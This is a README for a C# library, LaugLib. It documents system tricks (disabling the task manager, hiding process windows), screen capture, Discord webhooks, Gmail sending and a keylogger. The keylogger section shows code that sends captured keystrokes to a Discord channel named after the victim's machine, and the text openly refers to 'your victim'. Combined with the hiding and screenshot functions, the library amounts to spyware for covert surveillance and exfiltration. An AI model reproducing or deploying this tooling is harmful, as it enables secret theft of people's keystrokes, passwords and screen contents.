# LaugLib (.NET Framework & .NET6)
A Powerful Library with tons of Functions
**NOTE:** The KeyLogger Function to send the Buffer to a Discord Channel only works with .NET6 and up.

## LaugSys
System Stuff
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
 LaugSystem laugSys = new LaugSystem(); 
```
> Examples
```CSharp
laugSys.IsAdministrator(); //returns a bool, wether the current Process is running asAdministrator.

laugSys.GenerateAscii(int length); //Generate completely random ASCII Symbols with the given Length.

laugSys.GetRunningProcesses(); //Returns a list of Processes, that are currently up and running.

laugSys.GetRunningProcessesIcons(); //Returns a list of Images, of every running Process's icon.

laugSys.ProcessVisibility(Visibility visibility, IntPtr MainWindowHandle); //Change the Visibility of any Process.

laugSys.ConsoleWindow(bool show); //Change the Visibility of the ConsoleApplication.

laugSys.WinformsForm(Visibility visibility, Form form); //Change the Visibility of a Windows Form.

laugSys.ClearRecycleBin(bool IsAdminRequired); //Clears the recycle bin, takes a bool as input, wether clearing the bin should be executed as Admin or not.

laugSys.TaskManager(bool enable); //Enable or Disable the task manager.

laugSys.OpenCDTray(); // Opens the CD Tray if there is one.

laugSys.CloseCDTray(); //Closes the CD Tray if there is one and if its already open.

laugSys.ProcWindowState(string ProcessName); //Retrieve the Window State of a Process. First Parameter is The Process Name. Possible Return types: Hidden, Normal, Minimized, Maximized

laugSys.ProcWindowState(int ProcessID); //Retrieve the Window State of a Process. First Parameter is PID. Possible Return types: Hidden, Normal, Minimized, Maximized

laugSys.IProcWindowState(string ProcessName); //Retrieve the Window State of a Process. First Parameter is The Process Name. Possible Return types: 0 - Hidden, 1 - Normal, 2 - Minimized, 3 - Maximized, 4 - N/A

laugSys.IProcWindowState(int ProcessID); //Retrieve the Window State of a Process. First Parameter is PID. Possible Return types: 0 - Hidden, 1 - Normal, 2 - Minimized, 3 - Maximized, 4 - N/A

//GetAsyncKeyState (If you need a check in the background, use the class HotKey, it contains an EventHandler)
while (true)
{                
    if (laugSys.GetKeyState == Keys.Space)
    {
        //do something when Space is pressed.
    }                
}

```

## HotKey
Create Hotkeys and check wether they are being pressed or not. 
It uses the user32.dll, so the HotKeyEventHandler raises an Event even if the Program is not in focus.
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
HotKey hkHome = new HotKey(Keys.Home);
```
> In your Form1_Load Method, or Main Method for console apps use this:
```CSharp
 hkHome.OnHotKeyPressed += HkHome_OnHotKeyPressed;
 hkHome.StartKeyPressEventListener();
```
> EventHandler
```CSharp
private void HkHome_OnHotKeyPressed()
{
    MessageBox.Show("Home Pressed");
}
```

## SystemHotKeys (Obsolete)
Create Hotkeys and check wether they are being pressed or not. 
The Key Difference between GetAsyncKeyState and SystemHotKeys function is, that the background check is better and you can use any
window handle to check for pressed hotkeys.
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
SysHotKeys keys = new SysHotKeys();
```
> Register a Hotkey
```CSharp
keys.RegisterHotkey(HotKeys.HOME, Keys.Home, this.Handle); //Hotkeys.HOME is a Enum
keys.RegisterHotkey(0, Keys.Home, this.Handle); //You can also use an Integer to declare a Hotkey
```
> HotKey EventHandler
```CSharp
protected override void WndProc(ref Message m)
{
    if (m.Msg == 0x0312 && m.WParam.ToInt32() == (int)HotKeys.HOME)
    {
        //Execute code when HOME key is pressed
    }
    base.WndProc(ref m);
}
```
> Example Code
```CSharp
using LaugLib;

SysHotKeys keys = new SysHotKeys();

        enum HotKeys
        {
            HOME = 0,
        }
                
        public Form1()
        {
            InitializeComponent();
            keys.RegisterHotkey(HotKeys.HOME, Keys.Home, this.Handle);
        }
        
        protected override void WndProc(ref Message m)
        {
            if (m.Msg == 0x0312 && m.WParam.ToInt32() == (int)HotKeys.HOME)
            {
                MessageBox.Show("You Pressed Home!");
            }
            base.WndProc(ref m);
        }
```

## Hardware Info (Win32_DiskDrive)
Get some basic Hardware Info of the Win32_DiskDrive (Default: C:\)
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
LaugSystem.HardDriveInfo Info = new LaugSystem.HardDriveInfo();
```
> Retrieve Infos
```CSharp
Info.loadDriveInfo(); //load the infos, so we can access the info
string model = Info.Model;
string type = Info.Type;
string serialNo = Info.SerialNo;
```

## PrintScreen
Different ways to create a screenshot
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
PrintScreen prntScreen = new PrintScreen();
```
> Create Screenshots
```CSharp
prntScreen.CaptureScreen(); //returns an Image of the Screen

prntScreen.CaptureWindow(IntPtr handle); //returns an Imagine of a Window, use the MainWindowHandle for it to work.

prntScreen.CaptureScreenToFile(string filename, ImageFormat format); //captures an Image of the Screen and Saves it to the current Directory with the given format.

prntScreen.CaptureWindowToFile(IntPtr handle, string filename, ImageFormat format); //captures an Image of a Window and Saves it to the current Directory with the given format.

prntScreen.captureScreenToByteArray(); //returns a ByteArray
```
> CaptureWindow() Example
```CSharp
using LaugLib;
using LaugLib.DiscordWebHook;

PrintScreen prntScreen = new PrintScreen();

var handles = Process.GetProcessesByName("PROC_NAME").Select(x => x.MainWindowHandle).ToList();
Image img = prntScreen.CaptureWindow((IntPtr)handles[0]);
```

## DiscordWebhook
Send Messages, Embeds and Files
<br><br>
**Code usage**
> Importing webhook code
```CSharp
using LaugLib;
using LaugLib.DiscordWebHook;
```
> Creating webhook
```CSharp
DiscordWebhook hook = new DiscordWebhook();
hook.Url = "https://discordapp.com/hook-url";
```

> Creating message
```CSharp
DiscordMessage message = new DiscordMessage();
message.Content = "Example message, ping @everyone, <@userid>";
message.TTS = true; //read message to everyone on the channel
message.Username = "Webhook username";
message.AvatarUrl = "http://url-of-image";

//embeds
DiscordEmbed embed = new DiscordEmbed();
embed.Title = "Embed title";
embed.Description = "Embed description";
embed.Url = "Embed Url";
embed.Timestamp = DateTime.Now;
embed.Color = Color.Red; //alpha will be ignored, you can use any RGB color
embed.Footer = new EmbedFooter() {Text="Footer Text", IconUrl="http://url-of-image"};
embed.Image = new EmbedMedia() {Url="Media URL", Width=150, Height=150}; //valid for thumb and video
embed.Provider = new EmbedProvider() {Name="Provider Name", Url="Provider Url"};
embed.Author = new EmbedAuthor() {Name="Author Name", Url="Author Url", IconUrl="http://url-of-image"};

//fields
embed.Fields = new List<EmbedField>();
embed.Fields.Add(new EmbedField() {Name="Field Name", Value="Field Value", InLine=true });
embed.Fields.Add(new EmbedField() {Name="Field Name 2", Value="Field Value 2", InLine=true });

//set embed
message.Embeds = new List<DiscordEmbed>();
message.Embeds.Add(embed);
```

> Sending message
```CSharp

//message
hook.Send(message);

//file
hook.Send(message, new FileInfo("C:/File/Path.file"));
```

## KeyLogger
Easy to use KeyLogger with many functions
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
KeyLogger logger = new KeyLogger();
```
> Example usage that sends KeyLog Buffer to a Discord Channel
```CSharp
logger.BotToken = "DISCORD_BOT_TOKEN"; //Your Discord Bot Token
logger.ChannelName = Environment.MachineName; //This can be any String
logger.GuildID = 0; //The Guild ID (Server ID) to create the channel in and write the KeyLogs
logger.ParentID = 0; //Parent ID is basically the Category ID

logger.StartKeyLogger(true, 5, "-", true); //First Parameter: WriteToFile (Its required to send logs to discord), Second Parameter: MaxBufferLength, Third Parameter: The file Name, use "-" to generate a random File name, Fourth Parameter: SendToDiscordChannel
```
> Other Property
```CSharp
string buf = logger.Buffer; //logger.Buffer contains the Buffer, Don't call this in a while (true) loop, it will be bugged. Use Thread.Sleep() to call it in a loop, because the buffer gets written from a loop aswell, if you try to access the Property from a loop you will basically get the buffer multiplied by a few hundred of times.
```
> Known Bug with channel
```CSharp
logger.ClearSavedChannelID(); //If you delete the channel in your server, the Program wont be able to send any Logs, with this function you delete the saved channelID and it creates a new one for writing.
```
## General Bug With the KeyLogger
When the target User (your victim) types to fast, the Buffer's Output is kinda glitched. Idk if I will ever rewrite the Keylogger code, so this will be a bug for now.

## LaugMail
Send Emails with Gmail
<br><br>
**Code Usage**
> Imports
```CSharp
using LaugLib;
```
> Declare Instance
```CSharp
LaugMail mail = new LaugMail();
```
> Example
```CSharp
mail.SendGmail("receiver@anymail.com", "sender@gmail.com", "password", "subject", "message", true); 
```
for the password variable, dont use your account password, use a Application Password. Manage those [here](https://myaccount.google.com/apppasswords?)
